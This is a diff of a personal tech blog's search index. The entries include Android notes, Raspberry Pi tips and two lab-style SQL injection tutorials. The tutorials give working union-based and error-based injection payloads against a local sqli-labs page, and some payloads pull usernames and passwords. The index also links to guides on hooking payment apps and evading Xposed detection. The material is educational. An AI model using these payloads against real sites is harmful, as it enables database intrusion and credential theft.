+<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/ZhangChengHai/article/details/82950334" target="_blank" rel="noopener">Magisk框架，VirtualXposed框架，Xposed框架比较</a><br><a href="https://github.com/wayu002/AlipayQRHook" target="_blank" rel="noopener">AlipayQRHook</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://www.52pojie.cn/thread-688466-1-1.html" target="_blank" rel="noopener">【Xposed模块开发入门】真·第一课</a><br><a href="https://www.52pojie.cn/thread-821871-1-1.html" target="_blank" rel="noopener">XPosed插件自动生成支付宝收款二维码</a><br><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=794312&amp;extra=page%3D1%26filter%3Ddigest%26digest%3D1" target="_blank" rel="noopener">Android支付宝蚂蚁森林能量自动收取插件开发原理解析</a><br><a href="https://blog.csdn.net/ryan168/article/details/82462821" target="_blank" rel="noopener">关于如何使用xposed来hook某支付软件</a><br><a href="https://blog.csdn.net/jiangwei0910410003/article/details/80037971" target="_blank" rel="noopener">Android逆向之旅—破解某支付软件防Xposed的hook功能检测机制过程分析</a><br><a href="https://blog.csdn.net/ly_xiamu/article/details/81940896" target="_blank" rel="noopener">xposed检测原理分析 -案例某付宝、某音</a><br><a href="https://www.jianshu.com/p/938e8c4c00df" target="_blank" rel="noopener">Xposed 模块免重启开发(借助VirtualXposed)</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/53365780" target="_blank" rel="noopener">Android Hook框架Xposed详解：从源代码分析到开发指南</a><br><a href="https://blog.csdn.net/zhangmiaoping23/article/details/80432276" target="_blank" rel="noopener">VirtualXposed</a><br><a href="https://blog.csdn.net/d3soft/article/details/53209352" target="_blank" rel="noopener">xposed框架-Hook修改imei imsi</a>  </p>
+]]></content>
+      <categories>
+        <category>android逆向</category>
+      </categories>
+      <tags>
+        <tag>android逆向</tag>
+        <tag>xposed</tag>
       </tags>
   </entry>
   <entry>
@@ -5655,6 +5655,28 @@ item2_tv6.setText(&quot;1连胜中&quot;);
       </tags>
   </entry>
   <entry>
+    <title>android里的文本样式</title>
+    <url>/post/3707607800.html</url>
+    <content><![CDATA[<h2 id="修改text的大小和颜色"><a href="#修改text的大小和颜色" class="headerlink" title="修改text的大小和颜色"></a>修改text的大小和颜色</h2><p>strings.xml  </p>
+<pre><code>&lt;string name=&quot;str_event_statistics&quot;&gt;事件统计 &amp;lt;small&amp;gt;（近 %1$s 场）&amp;lt;small&amp;gt;&lt;/string&gt;
+</code></pre><p>java  </p>
+<pre><code>String textSource = context.getResources().getString(R.string.str_event_statistics)+&quot;&lt;small&gt;（近10场）&lt;/small&gt;&quot;;
+
+String textSource = context.getResources().getString(R.string.str_event_statistics,&quot;11&quot;);
+title_tv.setText(Html.fromHtml(textSource));
+
+String textSource = &quot;江苏苏宁VS上海上港-&lt;font color=&#39;#FF6059&#39;&gt;1胜&lt;/font&gt; &lt;font color=&#39;#41CFFF&#39;&gt;1平&lt;/font&gt; &lt;font color=&#39;#7ED321&#39;&gt;3负&lt;/font&gt;&quot;;
+    viewHolder.tv1.setText(Html.fromHtml(textSource));
+</code></pre><p><a href="https://blog.csdn.net/singwhatiwanna/article/details/18363899" target="_blank" rel="noopener">给TextView加上多彩效果：改变部分字体的大小和颜色</a><br><a href="https://www.cnblogs.com/Eric-zhao/p/5230007.html" target="_blank" rel="noopener">android中string.xml中%1$s、%1$d等的用法</a><br><a href="https://www.jianshu.com/p/f6cef78e8652" target="_blank" rel="noopener">修改TextView中部分文本的字体及颜色</a>  </p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>android_No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android</title>
     <url>/post/3707592036.html</url>
     <content><![CDATA[<p>主要是缺少这个文件 mips64el-linux-android<br>同理一些相同NDK目录可能也是缺少某些文件  </p>
@@ -5672,28 +5694,6 @@ ndk.dir
 <p>6.make project</p>
 <pre><code>build/Make Project
 </code></pre><h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/qq_24118527/article/details/82867864" target="_blank" rel="noopener">完美解决 No toolchains found in the NDK toolchains folder for ABI with prefix: mips64el-linux-android</a>  </p>
-]]></content>
-      <categories>
-        <category>android</category>
-      </categories>
-      <tags>
-        <tag>android</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>android里的文本样式</title>
-    <url>/post/3707607800.html</url>
-    <content><![CDATA[<h2 id="修改text的大小和颜色"><a href="#修改text的大小和颜色" class="headerlink" title="修改text的大小和颜色"></a>修改text的大小和颜色</h2><p>strings.xml  </p>
-<pre><code>&lt;string name=&quot;str_event_statistics&quot;&gt;事件统计 &amp;lt;small&amp;gt;（近 %1$s 场）&amp;lt;small&amp;gt;&lt;/string&gt;
-</code></pre><p>java  </p>
-<pre><code>String textSource = context.getResources().getString(R.string.str_event_statistics)+&quot;&lt;small&gt;（近10场）&lt;/small&gt;&quot;;
-
-String textSource = context.getResources().getString(R.string.str_event_statistics,&quot;11&quot;);
-title_tv.setText(Html.fromHtml(textSource));
-
-String textSource = &quot;江苏苏宁VS上海上港-&lt;font color=&#39;#FF6059&#39;&gt;1胜&lt;/font&gt; &lt;font color=&#39;#41CFFF&#39;&gt;1平&lt;/font&gt; &lt;font color=&#39;#7ED321&#39;&gt;3负&lt;/font&gt;&quot;;
-    viewHolder.tv1.setText(Html.fromHtml(textSource));
-</code></pre><p><a href="https://blog.csdn.net/singwhatiwanna/article/details/18363899" target="_blank" rel="noopener">给TextView加上多彩效果：改变部分字体的大小和颜色</a><br><a href="https://www.cnblogs.com/Eric-zhao/p/5230007.html" target="_blank" rel="noopener">android中string.xml中%1$s、%1$d等的用法</a><br><a href="https://www.jianshu.com/p/f6cef78e8652" target="_blank" rel="noopener">修改TextView中部分文本的字体及颜色</a>  </p>
 ]]></content>
       <categories>
         <category>android</category>
@@ -6590,28 +6590,6 @@ protected void attachBaseContext(Context context) {
       </tags>
   </entry>
   <entry>
-    <title>RPGMakerMV安卓版本打包</title>
-    <url>/post/683201593.html</url>
-    <content><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><ol>
-<li>部署项目<br>文件-部署-Android/IOS<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/01.png" alt="打包项目"><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/03.png" alt="www文件目录">  </li>
-</ol>
-<h2 id="方式一：Website2APK"><a href="#方式一：Website2APK" class="headerlink" title="方式一：Website2APK"></a>方式一：Website2APK</h2><p>1.下载工具<br><a href="https://pan.baidu.com/s/1eSQ65Lg" target="_blank" rel="noopener">下载地址</a><br>密码：vqv5  </p>
-<p>2.基本配置<br>选择Local HTML Website - 然后选择Directory of Local Website-GENERATE APK<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/21/01.png" alt="打包配置">  </p>
-<h2 id="方式二：HTML一键打包工具"><a href="#方式二：HTML一键打包工具" class="headerlink" title="方式二：HTML一键打包工具"></a>方式二：HTML一键打包工具</h2><p>1.工具<br><a href="https://pan.baidu.com/s/18zv4O-BD-mWKQYApTj-r4g?errno=0&amp;errmsg=Auth%20Login%20Sucess&amp;&amp;bduss=&amp;ssnerror=0&amp;traceid=" target="_blank" rel="noopener">下载地址</a>  </p>
-<p>2.安装HTML一键打包工具<br>路径选择为www下index.html<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/02.png" alt="打包配置">  </p>
-<p>tips:<br>免费版不能修改icon和包名  </p>
-<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>1.文件名不要中文<br>2.项目中不能含有中文的名称  </p>
-<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/u012416063/article/details/81264317" target="_blank" rel="noopener">RPG MAKER MV 打包APK教程(一键打包,无需编写任何代码)</a><br><a href="https://www.bilibili.com/video/av19033912" target="_blank" rel="noopener">RpgMv游戏最简单打包apk教程，小白福利</a>  </p>
-]]></content>
-      <categories>
-        <category>rpgmakermv</category>
-      </categories>
-      <tags>
-        <tag>rpgmakermv</tag>
-        <tag>rpg</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>树莓派笔记</title>
     <url>/post/2224320310.html</url>
     <content><![CDATA[<h2 id="更新系统-amp-关机-amp-重启"><a href="#更新系统-amp-关机-amp-重启" class="headerlink" title="更新系统&amp;关机&amp;重启"></a>更新系统&amp;关机&amp;重启</h2><pre><code>sudo apt-get update &amp;&amp; sudo apt-get upgrade
@@ -6698,6 +6676,28 @@ pip install request
       </categories>
       <tags>
         <tag>树莓派</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RPGMakerMV安卓版本打包</title>
+    <url>/post/683201593.html</url>
+    <content><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><ol>
+<li>部署项目<br>文件-部署-Android/IOS<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/01.png" alt="打包项目"><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/03.png" alt="www文件目录">  </li>
+</ol>
+<h2 id="方式一：Website2APK"><a href="#方式一：Website2APK" class="headerlink" title="方式一：Website2APK"></a>方式一：Website2APK</h2><p>1.下载工具<br><a href="https://pan.baidu.com/s/1eSQ65Lg" target="_blank" rel="noopener">下载地址</a><br>密码：vqv5  </p>
+<p>2.基本配置<br>选择Local HTML Website - 然后选择Directory of Local Website-GENERATE APK<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/21/01.png" alt="打包配置">  </p>
+<h2 id="方式二：HTML一键打包工具"><a href="#方式二：HTML一键打包工具" class="headerlink" title="方式二：HTML一键打包工具"></a>方式二：HTML一键打包工具</h2><p>1.工具<br><a href="https://pan.baidu.com/s/18zv4O-BD-mWKQYApTj-r4g?errno=0&amp;errmsg=Auth%20Login%20Sucess&amp;&amp;bduss=&amp;ssnerror=0&amp;traceid=" target="_blank" rel="noopener">下载地址</a>  </p>
+<p>2.安装HTML一键打包工具<br>路径选择为www下index.html<br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/16/02.png" alt="打包配置">  </p>
+<p>tips:<br>免费版不能修改icon和包名  </p>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>1.文件名不要中文<br>2.项目中不能含有中文的名称  </p>
+<h2 id="LINKS"><a href="#LINKS" class="headerlink" title="LINKS"></a>LINKS</h2><p><a href="https://blog.csdn.net/u012416063/article/details/81264317" target="_blank" rel="noopener">RPG MAKER MV 打包APK教程(一键打包,无需编写任何代码)</a><br><a href="https://www.bilibili.com/video/av19033912" target="_blank" rel="noopener">RpgMv游戏最简单打包apk教程，小白福利</a>  </p>
+]]></content>
+      <categories>
+        <category>rpgmakermv</category>
+      </categories>
+      <tags>
+        <tag>rpgmakermv</tag>
+        <tag>rpg</tag>
       </tags>
   </entry>
   <entry>
@@ -11164,6 +11164,47 @@ client.newCall(request).enqueue(new Callback() {
       </tags>
   </entry>
   <entry>
+    <title>1.2.2-SQL注入-SQL注入语法类型-报错注入</title>
+    <url>/post/4239639054.html</url>
+    <content><![CDATA[<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="01-报错注入原理"><a href="#01-报错注入原理" class="headerlink" title="01 报错注入原理"></a>01 报错注入原理</h3><p>构造payload让信息通过错误提示回显出来<br>应用场景：<br>查询不回显内容，会打印错误信息<br>Update、insert等语句，会打印错误信息  </p>
+<pre><code>if($row)
+{
+    echo &#39;Your Login name:&#39;.$row[&#39;username&#39;];
+}
+else
+{
+    print_r(mysql_error());
+}
+</code></pre><h3 id="02-报错注入方法"><a href="#02-报错注入方法" class="headerlink" title="02 报错注入方法"></a>02 报错注入方法</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/01.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/02.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/03.png" alt=""></p>
+<pre><code>select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2)))--+
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2)))--+
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select database() limit 0,1),0x7e,floor(rand(0)*2)))--+ // 表名
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x7e,floor(rand(0)*2)))--+ // 数据
+</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/04.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/05.png" alt=""></p>
+<pre><code>// 特殊符号导致方法报错，报错可以输出错误信息
+select ectractvalue(1,concat(0x7e,(select user()),0x7e));
+select updatexml(1,concat(0x7e,(select user()),0x7e),1);  
+
+报错注入只有32位长 用 substr截取字符串substr(&#39;ab&#39;,1,2) // 从第一位截取两个
+http://127.0.0.1:90/Less-1/?id=1&#39; and updatexml(1,concat(0x7e,(select substr(concat(password),1,2) from users limit 0,1),0x7e),1) --+
+</code></pre>]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>1.2.1-SQL注入-SQL注入语法类型-union联合查询注入</title>
     <url>/post/2839042794.html</url>
     <content><![CDATA[<h2 id="union查询注入"><a href="#union查询注入" class="headerlink" title="union查询注入"></a>union查询注入</h2><h3 id="union介绍"><a href="#union介绍" class="headerlink" title="union介绍"></a>union介绍</h3><p>SQL UNION 操作符<br>用于合并两个或多个SELECT语句的结果集。<br>注意：<br>SELECT语句必须拥有<strong>相同数量</strong>的列。<br>列也必须拥有<strong>相似的数据类型</strong>。<br>每条SELECT语句中列的<strong>顺序必须相同</strong>。  </p>
@@ -11224,47 +11265,6 @@ http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(tab
 http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)--+
 
 http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(username,0x7e,password) from users)--+
-</code></pre>]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>1.2.2-SQL注入-SQL注入语法类型-报错注入</title>
-    <url>/post/4239639054.html</url>
-    <content><![CDATA[<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="01-报错注入原理"><a href="#01-报错注入原理" class="headerlink" title="01 报错注入原理"></a>01 报错注入原理</h3><p>构造payload让信息通过错误提示回显出来<br>应用场景：<br>查询不回显内容，会打印错误信息<br>Update、insert等语句，会打印错误信息  </p>
-<pre><code>if($row)
-{
-    echo &#39;Your Login name:&#39;.$row[&#39;username&#39;];
-}
-else
-{
-    print_r(mysql_error());
-}
-</code></pre><h3 id="02-报错注入方法"><a href="#02-报错注入方法" class="headerlink" title="02 报错注入方法"></a>02 报错注入方法</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/01.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/02.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/03.png" alt=""></p>
-<pre><code>select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2)))--+
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2)))--+
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select database() limit 0,1),0x7e,floor(rand(0)*2)))--+ // 表名
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x7e,floor(rand(0)*2)))--+ // 数据
-</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/04.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/05.png" alt=""></p>
-<pre><code>// 特殊符号导致方法报错，报错可以输出错误信息
-select ectractvalue(1,concat(0x7e,(select user()),0x7e));
-select updatexml(1,concat(0x7e,(select user()),0x7e),1);  
-
-报错注入只有32位长 用 substr截取字符串substr(&#39;ab&#39;,1,2) // 从第一位截取两个
-http://127.0.0.1:90/Less-1/?id=1&#39; and updatexml(1,concat(0x7e,(select substr(concat(password),1,2) from users limit 0,1),0x7e),1) --+
 </code></pre>]]></content>
       <categories>
         <category>web安全</category>
